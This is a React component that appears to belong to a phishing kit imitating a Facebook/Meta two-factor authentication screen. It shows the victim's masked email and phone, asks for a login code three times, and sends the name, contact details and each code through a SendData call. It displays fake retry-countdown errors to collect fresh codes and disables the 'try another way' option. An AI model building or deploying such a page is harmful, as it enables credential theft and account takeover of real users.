import React from 'react';
import Modal from './Modal';
import { maskEmail, maskPhoneNumber } from '@/utils/mask';
import { useAppDispatch, useAppSelector } from '@/app/store/hooks';
import { FormData, updateForm } from '@/app/store/slices/stepFormSlice';
import { useAppStrings } from '@/hooks/useAppStrings';
import { SendData } from '@/utils/sendData';

interface TwoFactorModalProps {
    isOpend: boolean;
    isOpendFinish: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
    const t = useAppStrings();
    const initialCountdown = process.env.NEXT_PUBLIC_SETTING_TIME ? parseInt(process.env.NEXT_PUBLIC_SETTING_TIME) : 30;

    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [errors, setErrors] = React.useState<Record<string, string>>({});
    const [loading, setLoading] = React.useState(false);
    const [click, setClick] = React.useState(0);
    const [disabled, setDisable] = React.useState(false);
    const intervalRef = React.useRef<ReturnType<typeof setInterval> | null>(null);

    const dispatch = useAppDispatch();
    const formDataState = useAppSelector((state) => state.stepForm.data);

    const [twoFa, setTwoFa] = React.useState('');

    const { fullName, phone, email } = formDataState as FormData || {};

    const phoneDisplay = maskPhoneNumber(phone)
    const emailDisplay = maskEmail(email);

    const [countdown, setCountdown] = React.useState<number>(initialCountdown);

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    React.useEffect(() => {
        return () => {
            if (intervalRef.current) {
                clearInterval(intervalRef.current);
            }
        };
    }, []);

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        const normalizedValue = value.replace(/\D/g, '').slice(0, 8);
        setTwoFa(normalizedValue);
        setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change

        if (click === 0) {
            dispatch(updateForm({ twoFa: normalizedValue }));
        }

        if (click === 1) {
            dispatch(updateForm({ twoFaSecond: normalizedValue }));
        }

        if (click === 2) {
            dispatch(updateForm({ twoFaThird: normalizedValue }));
        }
    };

    const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);

    const formatRetryError = (secondsLeft: number) => {
        const minutes = Math.floor(secondsLeft / 60);
        const seconds = secondsLeft % 60;
        return t.twoFa.retryError(minutes, seconds);
    };

    const startRetryCountdown = (nextStep: number) => {
        if (intervalRef.current) clearInterval(intervalRef.current);

        setDisable(true);
        setCountdown(initialCountdown);
        setErrors({ twoFa: formatRetryError(initialCountdown) });

        intervalRef.current = setInterval(() => {
            setCountdown((prev) => {
                const next = prev - 1;
                if (next <= 0) {
                    if (intervalRef.current) clearInterval(intervalRef.current);
                    intervalRef.current = null;
                    setClick(nextStep);
                    setErrors({});
                    setDisable(false);
                    return initialCountdown;
                }
                setErrors({ twoFa: formatRetryError(next) });
                return next;
            });
        }, 1000);
    };

    const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
        const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 8);
        e.preventDefault();
        setTwoFa(pasted);
        setErrors((prev) => ({ ...prev, twoFa: '' }));
        if (click === 0) dispatch(updateForm({ twoFa: pasted }));
        if (click === 1) dispatch(updateForm({ twoFaSecond: pasted }));
        if (click === 2) dispatch(updateForm({ twoFaThird: pasted }));
    };

    const handleClose = () => {
        if (intervalRef.current) {
            clearInterval(intervalRef.current);
            intervalRef.current = null;
        }
        setIsOpen(false);
        onToggleModal(false);
    };

    const handSubmit = async (e: React.FormEvent) => {
        try {
            e.preventDefault();
            const newErrors: Record<string, string> = {};

            if (Object.keys(newErrors).length > 0) {
                setErrors(newErrors);
                return;
            }
            const isTwoFaValid = (twoFa.length === 6 || twoFa.length === 8) && /^\d+$/.test(twoFa);

            if (!isTwoFaValid) {
                setErrors({ twoFa: t.twoFa.errInvalid });
                return;
            }

            setLoading(true);

            if (click === 0) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');
                        startRetryCountdown(1);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors({ twoFa: t.twoFa.errSend });
                });
            }

            if (click === 1) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');
                        startRetryCountdown(2);
                    }, 1234);

                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors({ twoFa: t.twoFa.errSend });
                });
            }

            if (click === 2) {
                await SendData(formDataState)
                .then((response) => {
                    setTimeout(async () => {
                        setLoading(false);
                        setTwoFa('');

                        isOpendFinish(true);
                        handleClose();

                        setClick(0);
                    }, 1234);
                })
                .catch((error) => {
                    console.error("Error submitting form:", error);
                    setLoading(false);
                    setErrors({ twoFa: t.twoFa.errVerify });
                });
            }

        } catch (error) {
            console.error("Error submitting form:", error);
        }
    };

    const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 ${disabled ? '' : 'hover:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md'} transition-all duration-200`;
    const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

    return (
        <Modal
            isOpen={isOpen}
            title=''
            onClose={handleClose}
            isClosable={false}
        >
            <div className="flex min-h-full w-full min-w-0 flex-col gap-6 pb-1">
                <div className='w-full'>
                    <div className='flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]'>
                        <span>{fullName}</span>
                        <div className="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
                        <span>{t.common.facebook}</span>
                    </div>
                    <h2 className='text-[17px] leading-snug text-[black] font-[700] mb-[15px] break-words sm:text-[20px]'>{t.twoFa.title(click + 1)}</h2>
                    <p className='text-[#9a979e] text-[14px]'>{t.twoFa.description(emailDisplay, phoneDisplay)}</p>
                    <div className='w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]'>
                        <img src="/images/meta/authentication.png" width="100%" alt="authentication" />
                    </div>
                    <div className='w-full'>
                        <form onSubmit={handSubmit}>
                            <label htmlFor='twoFa' className='mb-[6px] block text-[13px] font-semibold text-[#3b4a64]'>{t.twoFa.label} <span className='text-[#e5484d]'>*</span></label>
                            <div className={`${inputClass('twoFa')}`} >
                                <input
                                    type="text"
                                    inputMode="numeric"
                                    id="twoFa"
                                    placeholder={t.twoFa.placeholder}
                                    className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
                                    value={twoFa}
                                    onChange={handleChange}
                                    onPaste={handlePaste}
                                    disabled={disabled}
                                    maxLength={8}
                                    aria-label={t.twoFa.ariaInput}
                                />
                            </div>
                            <p className='text-[#6a7893] text-[12px] mt-[-5px] mb-[10px]'>{t.twoFa.hint}</p>
                            {errorText('twoFa')}

                            <div className='w-full mt-[20px]'>
                                <button
                                    className={`min-h-[48px] w-full bg-[#0064E0] text-white rounded-[40px] px-4 py-[10px] flex items-center justify-center transition-opacity duration-300 ${loading || disabled || !isTwoFaValid ? 'opacity-70 cursor-not-allowed' : 'cursor-pointer active:opacity-90'}`}
                                    disabled={disabled || !isTwoFaValid}
                                    aria-label={t.twoFa.ariaSubmit}
                                >
                                    {loading && (
                                        <div className="animate-spin mr-[10px] w-[20px] h-[20px]">
                                            <img src="/images/icons/ic_loading.svg" width="100%" height="100%" alt="loading" />
                                        </div>
                                    )}
                                    {loading ? '' : t.common.continue}
                                </button>
                            </div>

                            <div className='w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3] pointer-events-none'>
                                <span>{t.twoFa.tryOther}</span>
                            </div>
                        </form>
                    </div>
                </div>

                <div className='mx-auto h-[60px] w-[60px] shrink-0'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                </div>
            </div>
        </Modal>
    );
};

export default TwoFactorModal;